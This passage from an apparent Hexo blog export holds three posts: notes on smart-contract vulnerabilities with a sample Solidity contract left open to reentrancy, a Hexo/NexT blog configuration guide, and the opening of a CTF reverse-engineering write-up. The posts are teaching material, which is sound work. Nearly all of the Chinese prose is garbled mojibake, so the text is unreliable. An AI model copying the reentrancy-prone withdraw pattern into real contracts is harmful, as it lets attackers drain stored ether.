<code>receive</code> å‡½æ•°æˆ–è€… <code>fallback</code>
å‡½æ•°æ¥å¤„ç†ï¼Œå¦‚æœä¸€ä¸ªåˆçº¦æ—¢æ²¡æœ‰ receive å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰ fallback
å‡½æ•°ï¼Œé‚£ä¹ˆå°±æ— æ³•æ¥æ”¶ ether äº†ã€‚</p>
<p>è€Œé‡å…¥æ¼æ´çš„æœ¬è´¨æ˜¯ï¼šVictim
å…ˆå¤„ç†äº†çœŸå¸ï¼Œå†å¤„ç†åˆçº¦è´¦æœ¬ä¸Šè®°å½•çš„å†…å®¹ã€‚ä¸ºä»€ä¹ˆè¿™æ ·çš„é¡ºåºä¼šå¯¼è‡´æ¼æ´å‘¢ï¼Ÿ</p>
<p>æ¯”å¦‚ attacker è°ƒç”¨ victim å‘è‡ªå·±è½¬ 0.001 weiï¼Œåœ¨ victim transfer
ä¹‹åï¼Œattacker æ”¶åˆ°äº† 0.001 weiï¼Œä½†åŒæ—¶ attacker ä¹Ÿä¼šè°ƒç”¨ fallback
å‡½æ•°ã€‚è€Œæ¶æ„æ”»å‡»è€…å¯ä»¥åœ¨ attacker çš„ fallback å‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ victim
è½¬è´¦å‡½æ•°ã€‚</p>
<p>è¿™æ ·ï¼Œvictim è´¦æœ¬è®°å½•çš„å†…å®¹å¹¶æ²¡æœ‰å‘ç”Ÿæ”¹å˜ï¼Œä½†è¯¥åˆçº¦ä¸‹å­˜å‚¨çš„ ether
å°±ä¼šä¸€ç‚¹ä¸€ç‚¹è¢«è½¬å¹²å‡€ã€‚</p>
<h3 id="æ ·ä¾‹">æ ·ä¾‹</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function donate(address _to) public payable &#123;</span><br><span class="line">        balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _who) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) public &#123;</span><br><span class="line">        if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">            (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                _amount;</span><br><span class="line">            &#125;</span><br><span class="line">            balances[msg.sender] -= _amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="é”™åˆ«å­—æ¼æ´">[1-2] é”™åˆ«å­—æ¼æ´</h2>
<p>ä»Šå¤©è·‘å®Œæ­¥å›æ¥æ¯”è¾ƒæ™šäº†ã€‚ã€‚æ‘¸ä¸ªé±¼å†™ä¸ªç®€å•ä¸€ç‚¹çš„æ¼æ´ã€‚</p>
<p>è¿™ç§æ¼æ´æ˜¾è€Œæ˜“è§ï¼Œå°±æ˜¯é‡è¦çš„å‡½æ•°çš„åç§°å†™çš„ä¸å¯¹ï¼Œæ¯”å¦‚ constructor å†™æˆ
construct0rï¼Œfallback å†™æˆ fal1backï¼ˆå½“ç„¶å¾ˆæ‰¯ä½†ä¸æ˜¯ä¸å¯èƒ½ã€‚ã€‚ï¼‰</p>
<p>å¦‚æœè¦æ£€æµ‹çš„è¯å¯ä»¥æ‰«æåˆçº¦ï¼Œç„¶åæŸ¥æ‰¾é‡Œé¢æ˜¯å¦æœ‰'constr'/'constru'/'onstruc'/'nstruct'/...è¿™æ ·çš„å­—ç¬¦ç‰‡æ®µï¼Œç„¶åæå–å‡ºæ¥ä¸æ­£å¸¸å‡½æ•°åå¯¹æ¯”ã€‚</p>
<p>æ€»ä¹‹å¯ä»¥åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹é‡è¦çš„å˜é‡åæˆ–è€…å‡½æ•°</p>
<p>constructor,receive,fallback,transfer,...</p>
<h2 id="abi-encode">[1-3] ABI encode</h2>
<p>Attacker åœ¨ä½¿ç”¨ callï¼Œsend ç­‰å‡½æ•°è°ƒç”¨ Victim æ—¶ï¼Œä¼šä½¿ç”¨ data
ä¼ è¾“å‡½æ•°æ ‡è¯†ç¬¦å’Œå‚æ•°ç­‰ã€‚å¦‚æœæˆ‘ä»¬ç²¾å¿ƒæ„é€  data çš„ç¼–ç ï¼Œå°±å¯ä»¥</p>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Smart Contract</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo &amp; Next åšå®¢é…ç½®ä¸ç¾åŒ–</title>
    <url>/2023/01/10/blog%20configuration%20&amp;%20beautify/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
é‰´äºæˆ‘è‡ªå·±çš„åˆ›ä½œæ¬²ï¼Œå‡†å¤‡æ­£å¼åœ°ç»è¥æˆ‘çš„åšå®¢XD
</blockquote>
<span id="more"></span>
<h1 id="xf-categories">0xF categories</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories: &#123;</span><br><span class="line">  - Geek tech: å®‰å…¨å¼±ç›¸å…³æŠ€æœ¯</span><br><span class="line">  - Software analysis technology: è½¯ä»¶åˆ†ææŠ€æœ¯</span><br><span class="line">  - CTF_practiceï¼šCTF æ¯”èµ›wpåŠæ—¥å¸¸é¢˜ç›®</span><br><span class="line">  - CTF_Theory: CTF ä¸­çš„ç†è®ºçŸ¥è¯†</span><br><span class="line">  - IOT: ç‰©è”ç½‘ç›¸å…³æŠ€æœ¯</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="x0-è¯´åœ¨å‰é¢">0x0 è¯´åœ¨å‰é¢:</h1>
<blockquote>
<p>ç¯å¢ƒï¼šWin11 å‚è€ƒèµ„æ–™ï¼šCodeSheepå¸ˆå‚…åœ¨bç«™ä¸Šçš„è§†é¢‘ &amp;
Nextå®˜æ–¹æ–‡æ¡£</p>
</blockquote>
<blockquote>
<p>åœ¨é…ç½®çš„è¿‡ç¨‹ä¸­ç»å¸¸å¿˜è®°è‡ªå·±é…äº†ä»€ä¹ˆï¼Œå¯¼è‡´è¿™ç¯‡åšå®¢å¯èƒ½ä¸æ˜¯å¾ˆå…¨ï¼Œåç»­æ¢ç”µè„‘é‡é…ç¯å¢ƒæ—¶å†è¡¥å……XD</p>
</blockquote>
<h1 id="x1-hexoåˆå§‹åŒ–ä¸€ä¸ªåšå®¢">0x1 Hexoåˆå§‹åŒ–ä¸€ä¸ªåšå®¢</h1>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åœ¨<a
href="https://nodejs.org/en/">Node.jså®˜ç½‘</a>ä¸­ä¸‹è½½nodejs</p>
<p>å…¶æ¬¡ï¼Œåœ¨ç»ˆç«¯è¾“å…¥<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>
&gt;ğŸ‘†è¿™ä¸€æ­¥å…¶å®å¯æœ‰å¯æ— ï¼Œåªä¸è¿‡æ¢åˆ°æ·˜å®é•œåƒæºä»¥åcnpmçš„å®‰è£…é€Ÿåº¦æ›´å¿«ä¸€äº›</p>
<p>è¾“å…¥<code>cnpm -install -g hexo-cli</code>å®‰è£…hexoæ¡†æ¶ï¼Œè¿™æ ·hexoå°±å®‰è£…å¥½å•¦XD</p>
<hr />
<p>å»ºç«‹ä¸€ä¸ªç©ºæ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨å‘½ä»¤è¡ŒæŒ‰åºè¾“å…¥<code>hexo init</code>,è¿™æ ·æœ¬åœ°çš„åšå®¢å°±æ­å»ºå¥½å•¦XD</p>
<p>æ‰“å¼€è‡ªå·±çš„Githubï¼Œåˆ›å»ºä¸€ä¸ªæ–°ä»“åº“ï¼Œåå­—ä¸º<code>ä¸ªäººåç§°.github.io</code></p>
<p>åœ¨ç»ˆç«¯è¾“å…¥<code>cnpm install --save hexo-deployer-git</code>å®‰è£…éƒ¨ç½²å™¨</p>
<p>æ‰“å¼€<strong><em>ç«™ç‚¹é…ç½®æ–‡ä»¶</em></strong>ï¼Œä¿®æ”¹Deploymentä¸‹çš„é…ç½®
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">Â  type: git</span><br><span class="line">Â  repo:https://github.com/GithubName/GithubName.github.io.git</span><br><span class="line">Â  branch: main</span><br></pre></td></tr></table></figure></p>
<p>ç»§ç»­åœ¨ç©ºæ–‡ä»¶å¤¹æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥<code>hexo g</code>å’Œ<code>hexo d</code>åšå®¢å°±èƒ½éƒ¨ç½²åˆ°è¿œç«¯å•¦XD</p>
<blockquote>
<p>è¿™é‡Œæˆ‘ä¹‹å‰æ˜¯é…ç½®è¿‡è´¦æˆ·å’Œå¯†ç çš„ï¼Œæ‰€ä»¥æ²¡æœ‰å¼¹å‡ºé…ç½®çš„é—®é¢˜ï¼Œå½“æ—¶ä¹Ÿæ˜¯ç¨€é‡Œç³Šæ¶‚å°±å¼„å¥½äº†ï¼Œå¯¼è‡´ç°åœ¨ä¸å¤ªæ¸…æ¥šåˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆï¼Œå°±æ²¡åŠæ³•å¤ç›˜ï¼Œç­‰åé¢æ¢æ–°ç”µè„‘å†è¯´å§XD</p>
</blockquote>
<h1 id="x2-hexo-config-theme-config">0x2 Hexo config &amp; Theme
config</h1>
<p>æˆ‘ä½¿ç”¨çš„è¿™ä¸€ä¸ªä¸»é¢˜ğŸ‘‡ï¼Œè¿™é‡Œå…·ä½“è®²è®²åšå®¢çš„é…ç½® <a
href="http://theme-next.iissnan.com/">NexT ä½¿ç”¨æ–‡æ¡£ (iissnan.com)</a>
ä¸ºäº†æè¿°æ–¹ä¾¿ï¼Œåœ¨ä»¥ä¸‹è¯´æ˜ä¸­ï¼š å°†<strong><em>hexo
initç”Ÿæˆçš„configæ–‡ä»¶</em></strong>ç§°ä¸º<code>ç«™ç‚¹é…ç½®æ–‡ä»¶</code>
å°†<strong><em>themeçš„configæ–‡ä»¶</em></strong>ç§°ä¸º<code>ä¸»é¢˜é…ç½®æ–‡ä»¶</code></p>
<hr />
<ul>
<li>é…ç½®ä¸»é¢˜ åœ¨hexoç«™ç‚¹ç›®å½•ä¸­ç”¨ç»ˆç«¯è¾“å…¥ğŸ‘‡ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
æ‰“å¼€<strong><em>ç«™ç‚¹é…ç½®æ–‡ä»¶</em></strong>ï¼Œä¿®æ”¹: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure></li>
<li>ä¸ªäººåå¥½-<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br></pre></td></tr></table></figure></li>
<li>ç«™ç‚¹å›¾åƒ-<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong>
ä¿®æ”¹ä¹‹å‰è®°å¾—åœ¨themes\nextï¼Œå›¾åƒå°ºå¯¸è¦ç¬¦åˆ16x16å’Œ32x32 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">Â  small: /images/favicon-16x16.png</span><br><span class="line">Â  medium: /images/favicon-32x32.png</span><br><span class="line">Â  apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">Â  safari_pinned_tab: /images/logo.svg</span><br><span class="line">Â  #android_manifest: /images/manifest.json</span><br><span class="line">Â  #ms_browserconfig: /images/browserconfig.xml</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>ç¤¾äº¤é“¾æ¥-<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Social Links</span><br><span class="line"># Usage: `Key: permalink || icon`</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span><br><span class="line">social:</span><br><span class="line">Â  GitHub: https://github.com/HeyGap || fab fa-github</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>æœç´¢:å…ˆåœ¨ç«™ç‚¹ç›®å½•ä¸‹å®‰è£…<code>npm install hexo-generator-searchdb --save</code></li>
</ul>
<p><strong><em>ç«™ç‚¹é…ç½®æ–‡ä»¶</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">Â  enable: true</span><br></pre></td></tr></table></figure>
<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong>ï¼šæ·»åŠ  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">Â  path: search.xml</span><br><span class="line">Â  field: post</span><br><span class="line">Â  format: html</span><br><span class="line">Â  limit: 10000</span><br></pre></td></tr></table></figure></p>
<hr />
<ul>
<li>å¼•ç”¨ç¤ºä¾‹ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;</span><br><span class="line">é¡ä¸æœ‰åˆ é²œå…‹æœ‰ç»ˆ</span><br><span class="line">&lt;p&gt;&lt;p&gt;</span><br><span class="line">&lt;br&gt;ã€Šè¯—ç»ã€‹</span><br><span class="line">&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
é¡ä¸æœ‰åˆ é²œå…‹æœ‰ç»ˆ
<p>
<p>
<br>ã€Šè¯—ç»ã€‹
</blockquote></li>
</ul>
<hr />
<ul>
<li>æ›´å¤§æ›´æœ‰å¸å¼•åŠ›çš„å›¾ç‰‡æ¥æºäº<code>&lt;img src="/image-url" class="full-image" /&gt;</code></li>
</ul>
<hr />
<ul>
<li>Bootstrap Calloutä½¿ç”¨æ–¹å¼</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼Œ<code>class_name</code>Â å¯ä»¥æ˜¯ä»¥ä¸‹åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå€¼ï¼š</p>
<div class="note default">
            <p>default</p>
          </div>
<div class="note primary">
            <p>primary</p>
          </div>
<div class="note success">
            <p>success</p>
          </div>
<div class="note info">
            <p>info</p>
          </div>
<div class="note warning">
            <p>warning</p>
          </div>
<div class="note danger">
            <p>danger</p>
          </div>
<hr />
<h1 id="x3-latexé…ç½®">0x3 LaTexé…ç½®</h1>
<blockquote>
<p>æˆ‘è¿™è¾¹pandocæ€»æ˜¯å‡ºé”™ï¼Œäºæ˜¯è½¬ç”¨äº†kramed</p>
</blockquote>
<p>ç»ˆç«¯è¾“å…¥ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm uninstall hexo-renderer-marked --save</span><br><span class="line">cnpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
<p><strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong></p>
<blockquote>
<p>ä¸ºäº†åŠ å¿«æ¸²æŸ“é€Ÿåº¦ï¼Œper_pageæˆ‘é€‰çš„trueï¼Œå¦‚æœå«Œéº»çƒ¦å¯ä»¥ç›´æ¥false</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">Â  # Default (true) will load mathjax / katex script on demand.</span><br><span class="line">Â  # That is it only render those page which has `mathjax: true` in Front-matter.</span><br><span class="line">Â  # If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span><br><span class="line">Â  per_page: true</span><br><span class="line">Â  </span><br><span class="line">Â  # hexo-renderer-pandoc (or hexo-renderer-kramed) required for full MathJax support.</span><br><span class="line">Â  mathjax:</span><br><span class="line">Â  Â  enable: true</span><br><span class="line">Â  Â  # See: https://mhchem.github.io/MathJax-mhchem/</span><br><span class="line">Â  Â  mhchem: false</span><br></pre></td></tr></table></figure>
<p>è®°å¾—åœ¨éœ€è¦æ¸²æŸ“çš„mdåŠ å…¥ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure></p>
<p>Test the <span class="math inline">\(X_{n-1}\)</span></p>
<blockquote>
<p>ä¸è¿‡æ¸²æŸ“åå°±å¯¼è‡´å†™mdæ—¶å¤šäº†å‡ ä¸ªè§„çŸ©</p>
<ol type="1">
<li>---çš„ä¸Šä¸‹å¿…é¡»å„ç©ºä¸€æ ¼</li>
</ol>
</blockquote>
<p><a
href="https://www.luogu.com.cn/blog/over-knee-socks/latex-gong-shi-tai-quan-fixed">ã€å…¬å¼ã€‘KaTeX
ä½¿ç”¨æŒ‡å—ï¼ˆæ´›è°·ç‰¹ä¾›ï¼‰ - ç™½è‰²è¿‡è†è¢œ - æ´›è°·åšå®¢ (luogu.com.cn)</a></p>
<h1 id="x4-hexo-x-next-ç¾åŒ–">0x4 Hexo x Next ç¾åŒ–</h1>
<ul>
<li>åŠ¨æ€èƒŒæ™¯ åœ¨<strong><em>ç«™ç‚¹ç›®å½•</em></strong>æ‰“å¼€gitï¼Œè¾“å…¥
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-nest themes/next/source/lib/canvas-nest</span><br></pre></td></tr></table></figure> åœ¨<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong>ä¸­åŠ å…¥
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">canvas_nest: # ç½‘ç»œèƒŒæ™¯</span><br><span class="line">  enable: true</span><br><span class="line">  onmobile: true # display on mobile or not</span><br><span class="line">  color: &#x27;0,0,0&#x27; # RGB values, use &#x27;,&#x27; to separate</span><br><span class="line">  opacity: 0.5 # the opacity of line: 0~1</span><br><span class="line">  zIndex: -1 # z-index property of the background</span><br><span class="line">  count: 150 # the number of lines</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>è®°å¾—æŠŠå…¶ä»–çš„åŠ¨æ€èƒŒæ™¯å…³é—­å‘€ï¼Œæ¯”å¦‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">three:</span><br><span class="line">  enable: false</span><br><span class="line">  three_waves: false</span><br><span class="line">Â  canvas_lines: true</span><br><span class="line">Â  canvas_sphere: false</span><br><span class="line">canvas_ribbon:</span><br><span class="line">Â  enable: false</span><br></pre></td></tr></table></figure>
<hr />
<ul>
<li>æ–‡ç« ç»“å°¾
åœ¨è·¯å¾„Â <code>\themes\next\layout\_macro</code>Â ä¸­æ–°å»ºÂ <code>passage-end-tag.swig</code>Â æ–‡ä»¶,å¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------æ–‡ç« å°±åˆ°è¿™é‡Œå•¦ï¼&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;æ„Ÿè°¢æ‚¨çš„é˜…è¯»XD-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
æ¥ç€æ‰“å¼€<code>\themes\next\layout\_macro\post.swig</code>æ–‡ä»¶ï¼Œåœ¨<code>post-body</code>Â ä¹‹å(<code>END POST BODY</code>)ï¼ŒÂ <code>post-footer</code>Â ä¹‹å‰æ·»åŠ ä»¥ä¸‹ä»£ç :
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt; </span><br><span class="line">	&#123;% if not is_index %&#125; </span><br><span class="line">		&#123;% include &#x27;passage-end-tag.swig&#x27; %&#125; </span><br><span class="line">	&#123;% endif %&#125; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
ç„¶åæ‰“å¼€<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong>ï¼Œåœ¨æœ«å°¾æ·»åŠ ï¼š
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passage_end_tag: </span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>è´´ä¸€ä¸ª<a href="https://fontawesome.dashgame.com/">å›¾æ ‡åº“Font
Awesome)</a>ï¼Œ<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong>é‡Œçš„åœ¨çº¿å›¾æ ‡åŸºæœ¬éƒ½è¦ç”¨åˆ°å®ƒ</li>
</ul>
<hr />
<ul>
<li>ä»£ç å—å¤åˆ¶ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: night</span><br><span class="line">codeblock:</span><br><span class="line">  border_radius:</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    show_result: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">Â  Â  style: mac</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>å›åˆ°é¡¶éƒ¨ä¸é˜…è¯»è¿›åº¦ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">Â  enable: true</span><br><span class="line">Â  # Back to top in sidebar.</span><br><span class="line">Â  sidebar: false</span><br><span class="line">Â  # Scroll percent label in b2t button.</span><br><span class="line">Â  scrollpercent: true</span><br><span class="line">  </span><br><span class="line"># Reading progress bar</span><br><span class="line">reading_progress:</span><br><span class="line">Â  enable: true</span><br><span class="line">Â  # Available values: top | bottom</span><br><span class="line">Â  position: top</span><br><span class="line">Â  color: &quot;#7B68EE&quot;</span><br><span class="line">Â  height: 3px</span><br></pre></td></tr></table></figure> é™„ä¸€äº›å‚è€ƒèµ„æ–™XD~</li>
</ul>
<p><a
href="https://baike.baidu.com/item/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81#:~:text=%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BD%AF%E4%BB%B6%E4%B8%AD%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E5%9C%A8%E5%BE%88%E5%A4%9A%E8%BD%AF%E4%BB%B6%E4%B8%AD%EF%BC%8C%E9%83%BD%E4%BC%9A%E9%81%87%E5%88%B0%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%91%E5%B1%95%E6%9D%A5%E6%BA%90%20%E4%BA%BA%E7%9A%84%E7%9C%BC%E7%9D%9B%E7%9C%8B%E5%88%B0%E7%9A%84%E9%A2%9C%E8%89%B2%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9A,%E4%B8%80%E7%A7%8D%E6%98%AF%E5%8F%91%E5%85%89%E4%BD%93%E5%8F%91%E5%87%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%8C%E6%AF%94%E5%A6%82%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%BE%E7%A4%BA%E5%99%A8%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%9B%20%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%98%AF%E7%89%A9%E4%BD%93%E6%9C%AC%E8%BA%AB%E4%B8%8D%E5%8F%91%E5%85%89%EF%BC%8C%E8%80%8C%E6%98%AF%E5%8F%8D%E5%B0%84%E7%9A%84%E5%85%89%E4%BA%A7%E7%94%9F%20%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E3%80%82">åå…­è¿›åˆ¶é¢œè‰²ç _ç™¾åº¦ç™¾ç§‘
(baidu.com)</a></p>
<hr />
<ul>
<li>å¢åŠ é˜…è¯»æ¬¡æ•°/æ—¶é•¿å’Œè®¿å®¢æ•°-<strong><em>ä¸»é¢˜é…ç½®æ–‡ä»¶</em></strong>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true  #æ˜¯å¦å¼€å¯ä¸è’œå­ç»Ÿè®¡åŠŸèƒ½</span><br><span class="line">  total_visitors: true #æ˜¯å¦ç»Ÿè®¡æ€»è®¿å®¢æ•°</span><br><span class="line">  total_visitors_icon: user #è®¿å®¢æ•°å›¾æ ‡ä¸ºäººåƒ</span><br><span class="line">  total_views: true #æ˜¯å¦åŒçº§æ€»è®¿é—®æ•°</span><br><span class="line">  total_views_icon: eye #è®¿é—®æ•°å›¾æ ‡ä¸ºçœ¼ç›</span><br><span class="line">  post_views: true #æ˜¯å¦ç»Ÿè®¡æ–‡ç« è®¿é—®æ•°</span><br><span class="line">  post_views_icon: eye #è®¿é—®æ•°å›¾æ ‡ä¸ºçœ¼ç›</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>é“¾æ¥æ ·å¼
ä¿®æ”¹æ–‡ä»¶Â <code>themes\next\source\css\_common\components\post\post.styl</code>ï¼Œåœ¨æœ«å°¾æ·»åŠ å¦‚ä¸‹cssæ ·å¼ï¼š
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #6A5ACD;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<p>å‚è€ƒæ–‡ç« ğŸ‘‡</p>
<p><a href="https://www.mickeymiao.top/posts/f9b8ceb/">hexo
NexTä¸»é¢˜ç¾åŒ–æ€»ç»“ | MickeyMiao</a></p>
<p>æ·±åº¦ç¾åŒ–-æ”¾ç€åƒç°</p>
<p><a
href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">å¦‚ä½•åœ¨Hexoä¸­å¯¹æ–‡ç« mdæ–‡ä»¶åˆ†ç±»_è²Œä¼¼æ‰çº¿çš„åšå®¢-CSDNåšå®¢</a>
<a href="https://zhuanlan.zhihu.com/p/64965187">ä½¿ç”¨ Hexo Hey
ç®¡ç†ä½ çš„åšå®¢ - çŸ¥ä¹ (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023HwsSDUä¸“åœºCTF-wp</title>
    <url>/2023/11/19/comp%20-%202023HwsSDU%E4%B8%93%E5%9C%BACTF-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
HWSï¼PWN+RE+CRYPTO
</blockquote>
<span id="more"></span>
<h1 id="re">RE</h1>
<h2 id="re-1">Re</h2>
<blockquote>
<p>è¿™ä¸ªé¢˜æœ¬æ¥æ‰“å¥½é€†å‘åçš„åŒ…å‡†å¤‡å†™ wp
çš„ï¼Œç»“æœé‡æ–°åŠ è½½çš„æ—¶å€™ç»™è¦†ç›–äº†...å°±ä¸é…å›¾äº†ï¼Œå‡½æ•°é¡ºåºæŒ‰ç…§åæ±‡ç¼–ä»ä¸Šåˆ°ä¸‹æ¥åˆ†æçš„ã€‚</p>
</blockquote>
<p>æ‹¿åˆ°è¿™ä¸ªé¢˜çœ‹åˆ°æœ‰åè°ƒè¯•ï¼Œæ²¡ patch ï¼Œç›´æ¥é™æ€åˆ†æäº†</p>
<h4 id="st-important-function">- 1st important function</h4>
<p>ç¬¬ä¸€ä¸ªé‡è¦å‡½æ•°é‡Œæœ‰ä¸€ä¸ª flag{} çš„åˆ¤æ–­ï¼Œè¿˜æœ‰ä¸€ä¸ªå¯¹äº'-'çš„åˆ¤æ–­ï¼Œå¯ä»¥çŒœæµ‹
flag çš„æ ¼å¼ä¸º flag{uuid}</p>
<p>æ¥ä¸‹æ¥çš„ä¸€ä¸ªå‡½æ•°æœ‰èŠ±æŒ‡ä»¤ï¼ŒæŠŠ E8 æ”¹æˆ 90
